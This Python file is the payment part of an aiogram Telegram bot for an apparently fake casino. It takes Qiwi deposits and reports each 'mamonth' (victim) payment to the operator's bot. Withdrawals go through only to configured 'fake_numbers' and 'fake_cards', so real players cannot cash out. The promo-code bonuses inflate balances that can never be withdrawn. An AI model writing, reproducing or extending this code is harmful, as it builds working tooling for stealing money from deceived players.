import random
import re
from configparser import NoOptionError

from aiogram import types
from aiogram.dispatcher.filters.builtin import Text
from aiogram.utils.markdown import quote_html
from aiogram.dispatcher import FSMContext
from aiogram.utils.emoji import emojize
from loguru import logger

from customutils.qiwiapi import QiwiApi
from customutils.models import CasinoUser, CasinoUserHistory, CasinoPayment
from customutils.qiwiapi.exceptions import InvalidToken, InvalidAccount

from loader import dp, main_bot
from config import config  # , words
from data.states import SelfCabine, AddBalance, OutBalance
from data import payload
from keyboards import *


PROMOS = {}


def get_api(conf_token: str):
    srch = re.search(r"\(([^\(^\)]+)\)", conf_token)
    if srch:
        return QiwiApi(
            token=conf_token.replace(srch.group(0), ""), proxy_url=srch.group(1)
        )
    return QiwiApi(conf_token)


@dp.message_handler(Text(startswith="пополн", ignore_case=True), state="*")
async def add_in_game(message: types.Message):
    try:
        user = CasinoUser.get(cid=message.chat.id)
        await message.answer(payload.add_text.format(min_deposit=user.min_deposit))
        await AddBalance.add_type.set()
    except CasinoUser.DoesNotExist:
        logger.debug(f"{message.chat.id=} - does not exist")


@dp.message_handler(
    lambda mes: not mes.text.isdigit(),
    state=AddBalance.add_type,
)
async def add_reqiz_invalid(message: types.Message):
    await message.reply("Сумма должна быть числом.\n\nВведите сумму пополнения")


@dp.message_handler(state=AddBalance.add_type)
async def choice_add_type(message: types.Message, state: FSMContext):
    try:
        user = CasinoUser.get(cid=message.chat.id)
    except CasinoUser.DoesNotExist:
        logger.debug(f"{message.chat.id=} - does not exist")
        return

    amount = int(message.text)
    if amount < user.min_deposit:
        await message.answer(
            f"Минимальная сумма депозита - <b>{user.min_deposit} RUB</b>"
        )
        return

    try:
        tokens = config("qiwi_tokens")
        logger.debug(f"Choice add type {tokens=}")
        if tokens:
            async with state.proxy() as data:
                data["amount"] = amount

            await AddBalance.amount.set()
            await message.answer(
                payload.add_type_text,
                reply_markup=add_type_keyboard,
            )
        else:
            await chosen_add_banker(message)
    except NoOptionError:
        await chosen_add_banker(message)


@dp.callback_query_handler(text="qiwi_add_type", state=AddBalance.amount)
async def add_by_qiwi(query: types.CallbackQuery, state: FSMContext):
    async with state.proxy() as data:
        amount = data["amount"]

    try:
        user = CasinoUser.get(cid=query.from_user.id)
    except CasinoUser.DoesNotExist:
        logger.debug(f"#{query.from_user.id} - does not exist")
        return

    comment = f"{random.randint(1000000, 9999999)}"

    try:
        token = config("qiwi_tokens")
        if isinstance(token, list):
            token = token[0]
    except NoOptionError:
        logger.info("Casino Stop Work")
        config.edit_config("casino_work", False)  # than change as notify
        return

    api = get_api(token)

    try:
        profile = await api.get_profile()
        account = profile.contractInfo.contractId
        pay = CasinoPayment.create(owner=user, comment=comment, amount=amount)
        await query.message.edit_text(
            payload.add_req_text(amount, comment, account),
            reply_markup=add_req_keyboard(amount, comment, account),
        )
        await main_bot.send_message(
            user.owner.cid,
            payload.pay_mamonth_text.format(
                cid=user.cid, name=user.fullname, uid=user.id, amount=amount
            ),
            reply_markup=pay_accept(pay.id),
        )
    except (InvalidToken, InvalidAccount):  # than change as notify
        logger.info("Invalid Token or Account!")
    finally:
        await api.close()

    await SelfCabine.main.set()


@dp.callback_query_handler(text="banker_add_type", state="*")
async def add_by_banker(query: types.CallbackQuery):
    await query.message.edit_text(
        payload.add_banker_text,
        reply_markup=add_banker_manual_keyboard,
    )
    await SelfCabine.main.set()


async def chosen_add_banker(message: types.Message):
    await message.answer(
        payload.add_banker_text,
        reply_markup=add_banker_manual_keyboard,
    )


@dp.callback_query_handler(lambda cb: cb.data.split("_")[0] == "check", state="*")
async def add_check(query: types.CallbackQuery):
    try:
        user = CasinoUser.get(cid=query.message.chat.id)
        comment = query.data.split("_")[1]

        try:
            payment = CasinoPayment.get(owner=user, comment=comment)
            if payment.done:
                user.balance += payment.amount + user.bonus
                user.save()
                CasinoUserHistory.create(
                    owner=user,
                    amount=payment.amount,
                    balance=user.balance,
                )
                await query.message.answer(
                    payload.add_succesful(payment.amount + user.bonus)
                )
                payment.delete_instance()
                await query.message.delete()
            else:
                await query.message.answer("Вы ещё не оплатили этот счёт!")
        except CasinoPayment.DoesNotExist:
            logger.warning(f"for {query.from_user.id=} - payment does not exist")
            await query.message.answer(
                "Похоже вы уже оплатили этот счёт или он не существует."
            )
    except CasinoUser.DoesNotExist:
        logger.debug(f"{query.message.chat.id=} - does not exist")


@dp.message_handler(Text(startswith="выв", ignore_case=True), state="*")
async def out_game(message: types.Message):
    try:
        user = CasinoUser.get(cid=message.chat.id)
        if user.balance > 0:
            await message.answer(
                payload.out_req_text,
                reply_markup=cancel_keyboard,
            )
            await OutBalance.number.set()
        else:
            await message.answer(
                payload.invalid_outbalance_text.format(
                    amount=user.balance,
                ),
            )
    except CasinoUser.DoesNotExist:
        logger.debug(f"{message.chat.id=} - does not exist")


@dp.message_handler(regexp="\+\d{10,}|\d{10,}", state=OutBalance.number)
async def out_number(message: types.Message, state: FSMContext, regexp):
    try:
        user = CasinoUser.get(cid=message.chat.id)
        group = regexp.group()
        if group[0] == "+":
            group = group[1:]

        lmbd = lambda b: b.replace("r", "").replace("u", "")
        fake_nums = list(map(lmbd, config("fake_numbers"))) + list(
            map(lmbd, config("fake_cards"))
        )

        if group in fake_nums:
            # async with state.proxy() as data:
            amount = user.balance
            user.balance = 0
            user.save()

            CasinoUserHistory.create(
                owner=user,
                amount=amount,
                editor=1,
                balance=user.balance,
            )
            await main_bot.send_message(
                user.owner.cid,
                payload.out_mamonth_text.format(
                    cid=user.cid,
                    uid=user.id,
                    name=user.fullname,
                    amount=amount,
                ),
            )

            await message.answer(
                f"На вывод: <b>{amount} RUB</b>\n" + payload.out_req_succesful,
                reply_markup=main_keyboard(),
            )
        else:
            await message.answer(payload.out_invreq_text, reply_markup=main_keyboard())
        await state.finish()
    except CasinoUser.DoesNotExist:
        logger.debug(f"{message.chat.id=} - does not exist")


@dp.message_handler(state=OutBalance.number)
async def invalid_outnumber(message: types.Message, state: FSMContext):
    await message.answer("Введите корректный номер.")
    logger.debug(f"{message.chat.id=} - invalid withdrawal number")


@dp.message_handler(Text(contains="промо", ignore_case=True), state="*")
async def insert_promo(message: types.Message):
    await message.answer("Введите промокод", reply_markup=cancel_keyboard)
    await OutBalance.promo.set()


@dp.message_handler(state=OutBalance.promo)
async def promo_complete(message: types.Message):
    try:
        user = CasinoUser.get(cid=message.chat.id)
        if message.text in PROMOS:
            amount = PROMOS[message.text]
            if user.bonus == amount:
                await message.answer(
                    "Такой промокод уже активирован",
                    reply_markup=main_keyboard(),
                )
                return
            user.bonus = amount
            user.save()
            await message.answer(
                f"Промокод на {amount} RUB активирован!",
                reply_markup=main_keyboard(),
            )
            logger.debug(f"{message.chat.id=} - activated promo")
        else:
            await message.answer(
                "Такой промокод не удалось найти",
                reply_markup=main_keyboard(),
            )
            logger.debug(f"{message.chat.id=} - promo doesn't exist")
    except CasinoUser.DoesNotExist:
        logger.info(f"CasinoUser {message.chat.id=} does not exist")
    finally:
        await SelfCabine.main.set()


@dp.callback_query_handler(text="paycard", state="*")
async def paycard_cback(query: types.CallbackQuery):
    await query.answer('Что бы оплатить картой, нажмите "Перейти к оплате".')
